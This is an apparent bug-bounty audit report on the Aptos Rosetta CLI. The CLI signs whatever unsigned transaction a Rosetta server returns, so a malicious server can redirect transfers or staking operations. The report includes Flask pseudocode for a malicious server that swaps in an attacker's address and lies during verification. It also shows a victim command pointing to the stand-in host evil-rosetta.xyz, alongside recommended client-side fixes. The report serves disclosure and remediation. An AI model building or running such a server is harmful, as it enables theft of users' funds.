# Audit Report

## Title
Rosetta CLI Complete Trust in Server-Provided Transaction Data Enables Transaction Manipulation Attacks

## Summary
The Aptos Rosetta CLI lacks independent client-side validation of transaction contents, allowing a malicious Rosetta server to trick users into signing arbitrary transactions that differ from their intent. An attacker can set up a compromised Rosetta server and social engineer victims into connecting to it, resulting in complete loss of user funds.

## Finding Description

The Aptos Rosetta CLI (`aptos-rosetta-cli`) is designed to interact with Rosetta API servers to construct and submit blockchain transactions. The CLI accepts a `--rosetta_api_url` parameter that specifies which Rosetta server to connect to. [1](#0-0) 

The critical vulnerability exists in the transaction construction flow. When a user initiates a transaction (e.g., transfer, set operator, create stake pool), the CLI performs these steps:

1. **Metadata Retrieval**: Calls `/construction/metadata` on the Rosetta server to get transaction parameters (sequence number, gas price, max gas). [2](#0-1) 

2. **Transaction Construction**: Calls `/construction/payloads` which returns a hex-encoded unsigned transaction. [3](#0-2) 

3. **Signing**: The client deserializes and signs whatever transaction the server provided. [4](#0-3) 

4. **Verification**: Calls `/construction/parse` to verify the transaction matches the intended operations. 

**The critical flaw**: All validation calls go to the same Rosetta server. A malicious server can:
- Return a completely different transaction in step 2 (e.g., transfer to attacker instead of intended recipient)
- Lie in step 4 and claim the transaction matches the user's intent

The CLI has no independent mechanism to verify that the transaction being signed actually matches what the user requested. The only validation is asking the malicious server "is this transaction correct?" and trusting its response.

**Attack Scenario:**
1. Attacker sets up malicious Rosetta server at `http://evil-rosetta.xyz`
2. User runs: `aptos-rosetta-cli transfer --rosetta_api_url http://evil-rosetta.xyz --receiver 0xBOB --amount 1000000 --private-key ...`
3. CLI calls `/construction/payloads` - malicious server returns transaction that transfers to ATTACKER (0xEVIL) instead of BOB
4. CLI signs the malicious transaction
5. CLI calls `/construction/parse` for verification - malicious server lies: "Yes, this sends to BOB"
6. User's signature is now on a transaction sending funds to attacker
7. Attacker submits signed transaction to real blockchain

The transaction construction happens in `construction_payloads` on the server side: [5](#0-4) 

The server builds the `RawTransaction` using metadata it controls (sequence number, gas price, gas amount), and the client signs it without independent verification.

## Impact Explanation

This vulnerability enables **complete theft of user funds** and **unauthorized staking operations** for any user tricked into connecting to a malicious Rosetta server. 

The impact qualifies as **Medium to High severity**:
- **Loss of Funds**: Users can lose their entire wallet balance through malicious transfers
- **Staking Manipulation**: Attackers can set themselves as operators/voters for victim's stake pools, gaining control over staking rewards and voting power
- **Governance Impact**: Malicious stake pool operations could affect on-chain governance if victims are validators or large stakers

While this doesn't directly compromise the blockchain protocol, it breaks a critical security guarantee that **users should be able to verify what they're signing before signing it**. The CLI fails to provide this protection.

According to Aptos bug bounty criteria, this could qualify as Medium severity ("Limited funds loss or manipulation") or potentially High severity depending on the scope of victims affected.

## Likelihood Explanation

**Likelihood: Medium to High**

The attack requires:
1. **Social Engineering**: Convincing users to connect to the malicious server (e.g., through phishing, fake documentation, compromised tutorials)
2. **No technical sophistication from victim**: Once connected, the attack is automatic and undetectable
3. **Simple attacker setup**: Running a malicious Rosetta server is trivial - just return crafted responses to API calls

Factors increasing likelihood:
- Users may not realize the security implications of the `--rosetta_api_url` parameter
- Legitimate use cases exist for connecting to third-party Rosetta servers (e.g., for better performance)
- No warnings or security prompts in the CLI when connecting to non-default servers
- The attack leaves no trace until the malicious transaction appears on-chain

## Recommendation

**Immediate Fix**: Implement client-side independent validation of transaction contents before signing.

**Recommended changes to `crates/aptos-rosetta/src/client.rs`:**

1. **After receiving the unsigned transaction from `/construction/payloads`**, deserialize it and independently verify:
   - The transaction sender matches the expected sender
   - The transaction payload matches the intended operation (e.g., transfer to correct recipient, correct amount)
   - Gas parameters are reasonable (not excessively high)
   - Sequence number matches on-chain value (query from a trusted source)

2. **Add an optional `--trusted-rest-api-url` parameter** that points to a trusted Aptos REST API endpoint, and use it to:
   - Independently fetch the account's sequence number
   - Verify gas price estimates against network averages
   - Validate transaction contents before signing

3. **Display transaction details to the user** before signing:
   - Show the parsed transaction payload in human-readable format
   - Require explicit user confirmation
   - Warn when connecting to non-default Rosetta servers

4. **Implement transaction parsing and validation** that doesn't rely on the Rosetta server:
   - Parse the BCS-encoded transaction locally
   - Extract and display operation details (transfer recipient, amount, etc.)
   - Compare against user's original intent

**Example fix snippet for validation logic:**
```rust
// After getting unsigned_transaction from payloads response
let unsigned_txn: RawTransaction = bcs::from_bytes(&hex::decode(&response.unsigned_transaction)?)?;

// Independently verify the transaction matches intent
match &unsigned_txn.payload() {
    TransactionPayload::EntryFunction(entry) => {
        // Verify function matches expected operation
        // Verify arguments match user input
        // For transfers: check recipient and amount
    }
    _ => return Err(anyhow!("Unexpected transaction payload type"))
}

// Optionally: verify against trusted REST API
if let Some(trusted_api) = trusted_rest_api {
    let onchain_sequence = query_sequence_number(trusted_api, sender).await?;
    if unsigned_txn.sequence_number() != onchain_sequence {
        warn!("Sequence number mismatch! Server: {}, On-chain: {}", 
              unsigned_txn.sequence_number(), onchain_sequence);
    }
}
```

## Proof of Concept

**Malicious Server Setup** (Python pseudocode):
```python
from flask import Flask, request, jsonify

app = Flask(__name__)
ATTACKER_ADDRESS = "0x1234...EVIL"

@app.route('/construction/payloads', methods=['POST'])
def malicious_payloads():
    data = request.json
    # User requested transfer to BOB, but we return transfer to ATTACKER
    # Build malicious RawTransaction with transfer to ATTACKER_ADDRESS
    malicious_transaction = build_transfer_transaction(
        sender=data['operations'][0]['account']['address'],
        receiver=ATTACKER_ADDRESS,  # Instead of intended recipient
        amount=extract_amount(data['operations']),
        sequence_number=data['metadata']['sequence_number'],
        gas_price=data['metadata']['gas_price_per_unit'],
        max_gas=data['metadata']['max_gas_amount']
    )
    return jsonify({
        'unsigned_transaction': encode_bcs_hex(malicious_transaction),
        'payloads': [create_signing_payload(malicious_transaction)]
    })

@app.route('/construction/parse', methods=['POST'])
def malicious_parse():
    # Always claim the transaction matches user intent
    return jsonify({
        'operations': request.json['expected_operations'],  # Lie about operations
        'account_identifier_signers': [...]
    })

@app.route('/construction/submit', methods=['POST'])
def submit():
    # Submit the signed malicious transaction to real blockchain
    submit_to_real_blockchain(request.json['signed_transaction'])
    return jsonify({'transaction_identifier': {'hash': '...'}})
```

**Victim Command:**
```bash
aptos-rosetta-cli transfer \
  --rosetta_api_url http://evil-rosetta.xyz \
  --receiver 0xBOB \
  --amount 1000000 \
  --private-key-file victim_key.txt
```

**Result**: Victim signs a transaction sending 1,000,000 tokens to ATTACKER, not BOB. The CLI shows no warning because all verification calls go to the malicious server.

---

## Notes

This vulnerability is specific to the **Rosetta CLI client tool**, not the core Aptos blockchain protocol. The blockchain itself functions correctly - the issue is that the CLI tool lacks security controls to protect users from malicious servers. However, since the CLI is part of the official Aptos Core repository and is used by operators and developers, it represents a real security risk that could lead to fund loss for users of this tool.

The vulnerability could be mitigated by:
1. User education about server trust
2. Implementing the technical fixes above
3. Considering whether the Rosetta CLI should only connect to localhost by default and require explicit flags to connect to remote servers

### Citations

**File:** crates/aptos-rosetta-cli/src/common.rs (L47-58)
```rust
pub struct UrlArgs {
    /// URL for the Aptos Rosetta API. e.g. http://localhost:8082
    #[clap(long, default_value = "http://localhost:8082")]
    rosetta_api_url: url::Url,
}

impl UrlArgs {
    /// Retrieve a [`RosettaClient`]
    pub fn client(self) -> RosettaClient {
        RosettaClient::new(self.rosetta_api_url)
    }
}
```

**File:** crates/aptos-rosetta/src/client.rs (L660-671)
```rust
        let (metadata, public_keys) = self
            .metadata_for_ops(
                sender,
                network_identifier.clone(),
                operations.clone(),
                max_gas,
                gas_unit_price,
                expiry_time_secs,
                sequence_number,
                keys,
            )
            .await?;
```

**File:** crates/aptos-rosetta/src/client.rs (L687-694)
```rust
        let response = self
            .unsigned_transaction(
                network_identifier.clone(),
                operations.clone(),
                metadata.metadata,
                public_keys,
                parse_not_same,
            )
```

**File:** crates/aptos-rosetta/src/client.rs (L830-845)
```rust
        // Sign the unsigned transaction
        let unsigned_transaction: RawTransaction = bcs::from_bytes(&hex::decode(
            unsigned_response.unsigned_transaction.clone(),
        )?)?;
        let signing_message = hex::encode(unsigned_transaction.signing_message().unwrap());

        // Sign the payload if it matches the unsigned transaction
        for payload in unsigned_response.payloads.into_iter() {
            let account = &payload.account_identifier;
            let private_key = keys
                .get(&account.account_address()?)
                .expect("Should have a private key");
            signers.push(account.clone());

            assert_eq!(signing_message, payload.hex_bytes);
            let txn_signature = private_key.sign(&unsigned_transaction).unwrap();
```

**File:** crates/aptos-rosetta/src/construction.rs (L1386-1399)
```rust
    let transaction_factory = TransactionFactory::new(server_context.chain_id)
        .with_gas_unit_price(metadata.gas_price_per_unit.0)
        .with_max_gas_amount(metadata.max_gas_amount.0);

    let mut txn_builder = transaction_factory
        .payload(txn_payload)
        .sender(sender)
        .sequence_number(metadata.sequence_number.0);

    // Default expiry is 30 seconds from right now
    if let Some(expiry_time_secs) = metadata.expiry_time_secs {
        txn_builder = txn_builder.expiration_timestamp_secs(expiry_time_secs.0)
    }
    let unsigned_transaction = txn_builder.build();
```
